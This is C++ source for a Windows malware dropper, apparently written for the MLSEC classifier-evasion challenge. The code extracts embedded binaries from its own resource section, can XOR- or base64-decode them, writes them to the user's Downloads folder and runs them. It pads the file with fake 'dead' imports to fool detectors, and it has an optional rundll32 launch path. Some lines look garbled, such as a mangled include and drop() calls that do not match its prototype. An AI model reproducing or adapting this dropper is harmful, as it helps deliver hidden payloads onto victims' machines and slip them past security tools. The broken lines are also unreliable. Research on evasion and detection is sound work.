// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// Required Imports
#define _CRT_SECURE_NO_WARNINGS

#ifndef DROPPER_XOR_KEY
#define DROPPER_XOR_KEY 0
#endif

#ifndef DROPPER_BASE64
#define DROPPER_BASE64 0
#endif

#ifndef DROPPER_OUTPUT
#define DROPPER_OUTPUT "\\FileSystem_exe_rebuild\\FileSystem_exe_rebuild.exe"
#endif

#include<cstdlib>
#include<cstdint>
#include<iostream>
#include<stdio.h>		// Debug Prints
#include<cstdint>
#include<windows.h>		// Resource Management
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed
#include<map>
#include<string>
#include<cstring>
#include<algorithm>
#include<vector>
#include<filesystem>

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<uxtheme.h>
// #include<atlstr.h>
// #include<atlenc.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")

// Functions prototypes
void dead();
std::uint64_t check_version();
void w7_dropper_start();
void w11_dropper_start();
void drop(int size, void* buffer, std::string);
void* XOR(void* data, int size);
void* base64decode(void* data, DWORD* size);
void launch(std::string);
void set_name(std::uint64_t);
void setup_name(std::uint64_t);

// Dropper Configurations
#define DEAD_IMPORTS
// #define RANDOM_NAME
#define NAME_SIZE 10
//#define PAYLOAD_CMP_TEST
//#define DROPPER_EXTRACT_TEST
#define W7_EXTRACT
//#define INJECT


// global: final binary name

typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
std::uint64_t os_version;
HMODULE h;

// 1 w11calc.exe (calculator for windows 11)
// 2 payload.exe (copies the version of calculator onto github)
// 3 payload.bat (copies calc.exe onto Downloads)
// 4 7calc.exe (calculator for windows 7)

std::string name1;
std::string name2;
std::string name3;
std::string name4;

HRSRC r1;
HRSRC r2;
HRSRC r3;
HRSRC r4;

HGLOBAL rc1;
HGLOBAL rc2;
HGLOBAL rc3;
HGLOBAL rc4;

void* data1;
void* data2;
void* data3;
void* data4;

DWORD size1;
DWORD size2;
DWORD size3;
DWORD size4;

// Entry Point
int main(int argc, char* argv[])
{

	os_version = check_version();

	setup_name(os_version);

	set_name(os_version);

	// Handle to myself
	h = GetModuleHandle(NULL);

	if (os_version == 0){
		std::cout << "check_version failed. Cannot veriy OS version";
		return 0;
	}


/////////////////////////////////////////////////////

	 //Windows 7 version of Dropper

/////////////////////////////////////////////////////

	else if (os_version == 6) {
#ifdef W7_EXTRACT

		w7_dropper_start();

	#if DROPPER_BASE64 == 1
		data2 = base64decode(data2, &size2);
		data3 = base64decode(data3, &size3);
	#endif

	#if DROPPER_XOR_KEY != 0
		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
		data2 = XOR(data2, size2);
		data3 = XOR(data3, size3);
	#endif

		drop(data2, size2, name2);

		drop(data3, size3, name3);

		launch(name2);

		launch(name3);
#else

		w7_dropper_start();

	#if DROPPER_BASE64 == 1
		data4 = base64decode(data4, &size4);
	#endif

	#if DROPPER_XOR_KEY != 0
		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
		data4 = XOR(data4, size4);
	#endif

		std::cout << "This is name: " << name4 << "\n";

		printf("This is data4: %p\n", data4);
		printf("This is size: %llu\n", (unsigned long long) size4);
		drop(data4, size4, name4);

		launch(name4);

#endif

#ifdef DEAD_CODE
		// dead code
		dead();
#endif
	// exit without waiting child process

	}

////////////////////////////////////////////////////////

	// Windows 10 handling of dropper

////////////////////////////////////////////////////////

	else if (os_version == 10) {

		w11_dropper_start();

	#if DROPPER_BASE64 == 1
		data1 = base64decode(data1, &size1);
	#endif

	#if DROPPER_XOR_KEY != 0
		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
		data1 = XOR(data1, size1);
	#endif

		drop(data1, size1, name1);

		launch(name1);
#ifdef DEAD_CODE
		// dead code
		dead();
#endif

	}

	else {
		std::cout << "OS that couldn't be handled.";
		return 0;
	}

	// exit without waiting child process
	return 0;
}

std::uint64_t check_version(){

	HMODULE hModule = GetModuleHandle("ntdll.dll");
	auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(hModule, "RtlGetVersion"));
	if (pRtlGetVersion != 0) { // sucess
		RTL_OSVERSIONINFOW info = {};
		info.dwOSVersionInfoSize = sizeof(info);

		if (pRtlGetVersion(&info) == 0){
			return (std::uint64_t) info.dwMajorVersion;
		}
	}

	return 0;

}

// Gets the upper part of the file path for the respective name (name1, name2, etc.)
void setup_name(std::uint64_t os_version) {
	if (os_version == 0){
		return;
	}
	else if (os_version == 6){
#ifdef W7_EXTRACT

		const char* temp = std::getenv("USERPROFILE");
		if (temp != nullptr){
			name2 += temp;
			name2 += "\\Downloads";

			name3 += temp;
			name3 += "\\Downloads";
		} else {
			printf("Problem with userprofile");
		}

#else

		const char* temp = std::getenv("USERPROFILE");
		if (temp != nullptr){
			name4 += temp;
			name4 += "\\Downloads";

		} else {
			printf("Problem with userprofile");
		}

#endif
	}
	else if (os_version == 10){

		const char* temp = std::getenv("USERPROFILE");
		if (temp != nullptr){
			name1 += temp;
			name1 += "\\Downloads";

		} else {
			printf("Problem with userprofile");
		}
	}
	else {
		std::cout << "Name wasn't given because of unknown OS\n";
	}
}

// Adds the lower end of the filepath to the respective name (name1, name2, etc.).
void set_name(std::uint64_t os_version)
{
	if (os_version == 0) {
		std::cout << "Could not set name due to invalid OS\n";
	}

	else if (os_version == 6) {

#ifdef W7_EXTRACT

	int valid = 0;
	#ifdef RANDOM_NAME
		valid = 0;
		srand(time(NULL));
		while (valid < NAME_SIZE)
		{
			char c = rand();
			if (c >= 'a' && c <= 'z')
			{
				name2.push_back(c);
			}
		}
		valid = 0;
		srand(time(NULL));
		while (valid < NAME_SIZE)
		{
			char c = rand();
			if (c >= 'a' && c <= 'z')
			{
				name3.push_back(c);
			}
		}
	#else

		name2+="file_get.exe";
		name3+="file_move.bat";

	#endif
#else

	name4+=DROPPER_OUTPUT;

#endif
	}

	else if (os_version == 10) {

#ifdef RANDOM_NAME
	int valid = 0;
	srand(time(NULL));
	while (valid < NAME_SIZE)
	{
		char c = rand();
		if (c >= 'a' && c <= 'z')
		{
			name1.push_back(c);
		}
	}
#else

	name1+=DROPPER_OUTPUT;
#endif
	}

	else {
		std::cout << "Cannot set name for unsupported OS\n";
	}

}

// Gets the resource from the resource section
void w7_dropper_start(){
#ifdef W7_EXTRACT
	// Locate Resource
	r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
	r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
	// Load Resource
	rc2 = LoadResource(h, r2);
	// Ensure nobody else will handle it
	data2 = LockResource(rc2);
	// Get embedded file size
	size2 = SizeofResource(h, r2);

	rc3 = LoadResource(h, r3);
	// Ensure nobody else will handle it
	data3 = LockResource(rc3);
	// Get embedded file size
	size3 = SizeofResource(h, r3);
#else
	//Locate Resource
	r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
	// Load Resource
	rc4 = LoadResource(h, r4);
	// Ensure nobody else will handle it
	data4 = LockResource(rc4);
	// Get embedded file size
	size4 = SizeofResource(h, r4);

#endif

}

// Gets the resource from the resource section
void w11_dropper_start(){
	// Locate Resource
	r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
	// Load Resource
	rc1 = LoadResource(h, r1);
	// Ensure nobody else will handle it
	data1 = LockResource(rc1);
	// Get embedded file size
	size1 = SizeofResource(h, r1);
}

// Launch a New Process based on the dropped file name
void launch(std::string run_exe)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// build injection command
#ifdef INJECT
	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
	char args[100 * NAME_SIZE];
	sprintf_s(args, 999, "%s %s", cmd, run_exe);
	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	// call directly
#else
	BOOL err = CreateProcessA(run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (!err) {
		printf("%u\n", GetLastError());
	}
#endif
}

// Decode a Base64 String
// modified and  copied from geeks for geeks
void* base64decode(void* data, DWORD* size)
{
	static const int decode_table[256] = {
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
		52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
		-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
		15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
		-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
		41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
	};

	char* in = (char*)data;
	size_t len = strlen(in);

	std::vector<uint8_t> out;
	out.reserve(len * 3 / 4);

	int val = 0;
	int valb = -8;

	for (size_t i = 0; i < len; i++) {
		unsigned char c = in[i];
		if (decode_table[c] == -1) continue;
		val = (val << 6) + decode_table[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}

	// allocate + null terminator
	void* buffer = malloc(out.size() + 1);
	memcpy(buffer, out.data(), out.size());
	((char*)buffer)[out.size()] = '\0';
	char* contents = ((char*) &buffer);
	*size = (DWORD)out.size();
	return buffer;
}


// XOR bytes in the buffer with a key
void* XOR(void* data, int size) {
	// auxiliary buffer
	// this is never freed, but ok, i'm not a goodware anyway
	void* buffer = malloc(size);
	unsigned char* test = (unsigned char*)malloc(size);
	for (int i = 0;i < size;i++)
	{
		((unsigned char*)buffer)[i] = ((unsigned char*)data)[i] ^ DROPPER_XOR_KEY;
		((unsigned char*)test)[i] = ((unsigned char*)buffer)[i];
	}
	free(test);
	return buffer;
}

// Drop buffer to file
void drop(int size, void* buffer, std::string drop_name)
{
	FILE* f = fopen(drop_name.c_str(), "wb");
	printf("drop has run");
	// traverse byte list
	if (!f) {
		perror("fopen");
	}
	else {
		// size always allocates one more byte than necessary so 
		// we have to compensate. I don't know why.
		for (int i = 0;i < size;i++)
		{
			// byte pointer
			unsigned char c1 = ((unsigned char*)buffer)[i];
			// drop byte to file
			fprintf(f, "%c", c1);
		}

		// file fully written
		fclose(f);
	}

}

// Dead Imports Function
void dead()
{
	return;
	memcpy(NULL, NULL, NULL);
	memset(NULL, NULL, NULL);
	strcpy_s(NULL, NULL, NULL);
	ShellAboutW(NULL, NULL, NULL, NULL);
	SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
	ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegDeleteKeyW(NULL, NULL);
	RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL, NULL, NULL);
	BSTR_UserFree(NULL, NULL);
	BufferedPaintClear(NULL, NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x, NULL, NULL, x, NULL);
	IsThemeActive();
	ImageList_Add(NULL, NULL, NULL);
	ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL, NULL, NULL, NULL);
	CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL, NULL);
	lstrcmpW(NULL, NULL);
	MulDiv(NULL, NULL, NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL, NULL, NULL, NULL);
	HeapSize(NULL, NULL, NULL);
	SetBkColor(NULL, NULL);
	SetBkMode(NULL, NULL);
	EmptyClipboard();
	CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL, NULL);
	CombineRgn(NULL, NULL, NULL, NULL);
	SetRectRgn(NULL, NULL, NULL, NULL, NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL, NULL);
	CreateRectRgn(NULL, NULL, NULL, NULL);
	CreateCompatibleBitmap(NULL, NULL, NULL);
	LineTo(NULL, NULL, NULL);
	MoveToEx(NULL, NULL, NULL, NULL);
	ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
	GetObjectW(NULL, NULL, NULL);
	GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
	GetTextMetricsW(NULL, NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL, NULL);
	GetDeviceCaps(NULL, NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL, NULL);
	GetTextExtentPointW(NULL, NULL, NULL, NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL, NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL, NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL, NULL, NULL);
	isalpha(NULL);
}
